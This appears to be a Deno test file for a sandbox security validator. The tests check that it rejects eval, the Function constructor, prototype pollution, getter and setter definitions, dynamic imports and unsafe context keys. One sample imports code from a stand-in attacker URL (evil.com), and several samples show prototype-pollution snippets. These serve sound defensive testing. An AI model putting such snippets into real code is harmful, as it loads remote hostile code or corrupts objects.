/**
 * Security Validator Tests
 *
 * Tests for Story 3.9 AC #2 (Input Validation)
 * - Malicious pattern detection (eval, Function, prototype pollution)
 * - Context object sanitization
 * - Code complexity validation
 */

import { assertEquals, assertThrows } from "@std/assert";
import {
  SecurityValidationError,
  SecurityValidator,
} from "../../../src/sandbox/security-validator.ts";

Deno.test({
  name: "SecurityValidator - reject eval() usage",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const result = eval("1 + 1");
      return result;
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "EVAL_USAGE",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject Function() constructor",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const fn = new Function("return 42");
      return fn();
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "FUNCTION_CONSTRUCTOR",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject __proto__ usage",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const obj = {};
      obj.__proto__.polluted = true;
      return obj;
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "PROTO_POLLUTION",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject constructor.prototype manipulation",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      Object.constructor["prototype"].polluted = true;
      return {};
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "CONSTRUCTOR_PROTOTYPE",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject __defineGetter__ usage",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const obj = {};
      obj.__defineGetter__("prop", () => "malicious");
      return obj;
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "DEFINE_GETTER",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject __defineSetter__ usage",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const obj = {};
      obj.__defineSetter__("prop", (val) => {});
      return obj;
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "DEFINE_SETTER",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject dynamic import()",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `
      const module = await import("https://evil.com/malicious.js");
      return module;
    `;

    assertThrows(
      () => validator.validateCode(maliciousCode),
      SecurityValidationError,
      "DYNAMIC_IMPORT",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject code exceeding max length",
  fn: () => {
    const validator = new SecurityValidator({ maxCodeLength: 100 });

    const longCode = "a".repeat(101);

    assertThrows(
      () => validator.validateCode(longCode),
      SecurityValidationError,
      "CODE_TOO_LONG",
    );
  },
});

Deno.test({
  name: "SecurityValidator - allow legitimate code",
  fn: () => {
    const validator = new SecurityValidator();

    const legitimateCode = `
      const data = [1, 2, 3, 4, 5];
      const sum = data.reduce((a, b) => a + b, 0);
      return sum;
    `;

    // Should not throw
    validator.validateCode(legitimateCode);
  },
});

Deno.test({
  name: "SecurityValidator - allow code with 'evaluate' (not eval)",
  fn: () => {
    const validator = new SecurityValidator();

    const code = `
      function evaluateResult(x) {
        return x * 2;
      }
      return evaluateResult(21);
    `;

    // Should not throw (evaluateResult is not eval)
    validator.validateCode(code);
  },
});

Deno.test({
  name: "SecurityValidator - reject dangerous context key: __proto__",
  fn: () => {
    const validator = new SecurityValidator();

    // Create malicious context with __proto__ key using bracket notation
    const maliciousContext: Record<string, unknown> = {};
    maliciousContext["__proto__"] = { polluted: true };

    assertThrows(
      () => validator.validateContext(maliciousContext),
      SecurityValidationError,
      "DANGEROUS_CONTEXT_KEY",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject dangerous context key: constructor",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousContext = {
      constructor: "malicious",
    };

    assertThrows(
      () => validator.validateContext(maliciousContext),
      SecurityValidationError,
      "DANGEROUS_CONTEXT_KEY",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject invalid context variable name",
  fn: () => {
    const validator = new SecurityValidator();

    const invalidContext = {
      "invalid-name": "value", // Hyphens not allowed in JS variable names
    };

    assertThrows(
      () => validator.validateContext(invalidContext),
      SecurityValidationError,
      "INVALID_CONTEXT_KEY",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject context with function values",
  fn: () => {
    const validator = new SecurityValidator();

    const contextWithFunction = {
      myFunc: () => "malicious",
    };

    assertThrows(
      () => validator.validateContext(contextWithFunction),
      SecurityValidationError,
      "FUNCTION_IN_CONTEXT",
    );
  },
});

Deno.test({
  name: "SecurityValidator - reject deeply nested context (>10 levels)",
  fn: () => {
    const validator = new SecurityValidator();

    // Create deeply nested object (11 levels)
    let nested: Record<string, unknown> = { value: "deep" };
    for (let i = 0; i < 11; i++) {
      nested = { child: nested };
    }

    assertThrows(
      () => validator.validateContext(nested),
      SecurityValidationError,
      "CONTEXT_TOO_DEEP",
    );
  },
});

Deno.test({
  name: "SecurityValidator - allow legitimate context",
  fn: () => {
    const validator = new SecurityValidator();

    const legitimateContext = {
      userId: 123,
      userName: "Alice",
      data: [1, 2, 3],
      config: {
        timeout: 5000,
        retries: 3,
      },
    };

    // Should not throw
    const result = validator.validateContext(legitimateContext);
    assertEquals(result, legitimateContext);
  },
});

Deno.test({
  name: "SecurityValidator - validate() validates both code and context",
  fn: () => {
    const validator = new SecurityValidator();

    const maliciousCode = `eval("malicious")`;
    const context = { userId: 123 };

    assertThrows(
      () => validator.validate(maliciousCode, context),
      SecurityValidationError,
      "EVAL_USAGE",
    );
  },
});

Deno.test({
  name: "SecurityValidator - hasPattern() detects patterns",
  fn: () => {
    const validator = new SecurityValidator();

    const codeWithEval = `eval("test")`;
    const codeWithoutEval = `return 42`;

    assertEquals(validator.hasPattern(codeWithEval, "EVAL_USAGE"), true);
    assertEquals(validator.hasPattern(codeWithoutEval, "EVAL_USAGE"), false);
  },
});

Deno.test({
  name: "SecurityValidator - getDangerousPatterns() returns pattern list",
  fn: () => {
    const patterns = SecurityValidator.getDangerousPatterns();

    assertEquals(patterns.length > 0, true);
    assertEquals(
      patterns.some((p) => p.type === "EVAL_USAGE"),
      true,
    );
    assertEquals(
      patterns.some((p) => p.type === "FUNCTION_CONSTRUCTOR"),
      true,
    );
  },
});

Deno.test({
  name: "SecurityValidator - getDangerousContextKeys() returns key list",
  fn: () => {
    const keys = SecurityValidator.getDangerousContextKeys();

    assertEquals(keys.length > 0, true);
    assertEquals(keys.includes("__proto__"), true);
    assertEquals(keys.includes("constructor"), true);
  },
});

Deno.test({
  name: "SecurityValidator - can disable code validation",
  fn: () => {
    const validator = new SecurityValidator({
      enableCodeValidation: false,
    });

    const maliciousCode = `eval("test")`;

    // Should not throw when validation is disabled
    validator.validateCode(maliciousCode);
  },
});

Deno.test({
  name: "SecurityValidator - can disable context sanitization",
  fn: () => {
    const validator = new SecurityValidator({
      enableContextSanitization: false,
    });

    const maliciousContext = {
      __proto__: { polluted: true },
    };

    // Should not throw when sanitization is disabled
    validator.validateContext(maliciousContext);
  },
});

Deno.test({
  name: "SecurityValidator - custom patterns work",
  fn: () => {
    const validator = new SecurityValidator({
      customPatterns: [
        {
          regex: /\bconsole\.log\(/,
          type: "CONSOLE_LOG",
          description: "console.log() detected",
          severity: "LOW",
        },
      ],
    });

    const code = `console.log("test")`;

    assertThrows(
      () => validator.validateCode(code),
      SecurityValidationError,
      "CONSOLE_LOG",
    );
  },
});

Deno.test({
  name: "SecurityValidator - SecurityValidationError has correct structure",
  fn: () => {
    const error = new SecurityValidationError(
      "TEST_TYPE",
      "Test pattern",
      "Test details",
    );

    assertEquals(error.name, "SecurityValidationError");
    assertEquals(error.violationType, "TEST_TYPE");
    assertEquals(error.pattern, "Test pattern");
    assertEquals(error.message.includes("TEST_TYPE"), true);
    assertEquals(error.message.includes("Test pattern"), true);

    const json = error.toJSON();
    assertEquals(json.type, "SecurityValidationError");
    assertEquals(json.violationType, "TEST_TYPE");
    assertEquals(json.pattern, "Test pattern");
  },
});
